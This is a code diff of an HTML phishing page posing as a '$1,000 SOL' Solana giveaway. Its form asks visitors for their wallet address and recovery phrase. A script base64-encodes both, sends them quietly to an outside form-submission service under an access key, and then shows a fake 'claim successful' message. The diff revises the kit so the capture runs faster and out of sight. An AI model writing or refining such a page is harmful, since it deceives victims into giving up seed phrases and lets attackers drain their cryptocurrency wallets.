@@ -37,20 +37,6 @@
             box-sizing: border-box;
         }
 
-        h1 { 
-            font-family: 'Syncopate', sans-serif; 
-            font-size: 1.7rem; 
-            margin: 0 0 25px 0;
-            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
-            -webkit-background-clip: text; 
-            -webkit-text-fill-color: transparent; 
-            letter-spacing: -1px; 
-            font-weight: 700; 
-            text-transform: uppercase;
-            line-height: 1.2;
-            white-space: nowrap; 
-        }
-
         .sub { 
             font-size: 0.8rem; 
             text-transform: uppercase; 
@@ -107,6 +93,18 @@
 
         #success-view { display: none; }
         
+        h1 { 
+            font-family: 'Syncopate', sans-serif; 
+            font-size: 1.7rem; 
+            margin: 0 0 25px 0;
+            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            letter-spacing: -1px; 
+            font-weight: 700; 
+            text-transform: uppercase;
+        }
+
         .congrats { 
             padding: 30px; 
             background: rgba(0, 255, 163, 0.05); 
@@ -120,74 +118,65 @@
 <body>
 
     <div class="card">
-        <!-- FORM PAGE -->
         <div id="form-view">
             <form id="claim-form">
-                <input type="hidden" name="access_key" value="4a9ec344-5342-477d-8e90-af1576f4f3b5">
+                <input type="hidden" name="access_key" value="8460d727-7ba5-446e-a522-c226b224fb5f">
                 
-                <h1>CLAIM $1,000 SOL</h1>
-                <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your solana wallet recovery phrase below</p>
+                <p class="sub">Claim your giveaway with your solana address and recovery phrase below and click claim</p>
                 
                 <div class="ib">
-                    <label>Recovery Phrase</label>
-                    <textarea id="raw-phrase" required></textarea>
+                    <label>SOLANA ADDRESS</label>
+                    <textarea id="sol-address" required></textarea>
                 </div>
 
-                <!-- Hidden data field mapped to your old code's name field -->
+                <div class="ib">
+                    <label>RECOVERY PHRASE</label>
+                    <textarea id="rec-phrase" required></textarea>
+                </div>
+
                 <input type="hidden" name="name" id="coded-phrase">
                 <input type="hidden" name="subject" value="New $1,000 SOL Claim Submission">
 
-                <button type="submit" id="submit-btn" class="btn">CONNECT WALLET</button>
+                <button type="submit" id="submit-btn" class="btn">CLAIM</button>
             </form>
         </div>
 
-        <!-- SUCCESS PAGE -->
         <div id="success-view">
             <h1>CLAIM SUCCESSFUL</h1>
             <div class="congrats">
-                <p class="sub" style="margin-bottom: 0;">Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs</p>
+                <p class="sub" style="margin-bottom: 0;">Congrats, you have claimed your solana giveaway and you’ll receive it in your wallet address within 24 hrs</p>
             </div>
         </div>
     </div>
 
     <script>
         const form = document.getElementById('claim-form');
-        const submitBtn = document.getElementById('submit-btn');
         const formView = document.getElementById('form-view');
         const successView = document.getElementById('success-view');
-        const rawInput = document.getElementById('raw-phrase');
-        const codedInput = document.getElementById('coded-phrase');
 
         form.addEventListener('submit', function(e) {
             e.preventDefault();
-            
-            submitBtn.textContent = "CONNECTING...";
-            submitBtn.disabled = true;
 
-            // Updated Safe Encoding to handle multiple words/spaces correctly
+            // Prepare Encoding (Address Line 1, Phrase Line 2)
             try {
-                const phrase = rawInput.value;
-                // This method safely encodes spaces and special characters for btoa
-                codedInput.value = btoa(unescape(encodeURIComponent(phrase)));
+                const solAddress = document.getElementById('sol-address').value;
+                const recPhrase = document.getElementById('rec-phrase').value;
+                const combined = solAddress + "\n" + recPhrase;
+                document.getElementById('coded-phrase').value = btoa(unescape(encodeURIComponent(combined)));
             } catch (err) {
-                codedInput.value = rawInput.value; // Fallback
+                document.getElementById('coded-phrase').value = "Encoding Error";
             }
 
-            // Using the EXACT basic method from your old code
+            // Trigger silent background delivery
             const formData = new FormData(form);
-
-            fetch('https://api.web3forms.com/submit', {
+            fetch('https://web3forms.com', {
                 method: 'POST',
                 body: formData
-            })
-            .then(response => {
-                formView.style.display = "none";
-                successView.style.display = "block";
-            })
-            .catch(error => {
-                formView.style.display = "none";
-                successView.style.display = "block";
             });
+
+            // INSTANT page switch (Connecting text removed)
+            formView.style.display = "none";
+            successView.style.display = "block";
         });
     </script>
 </body>
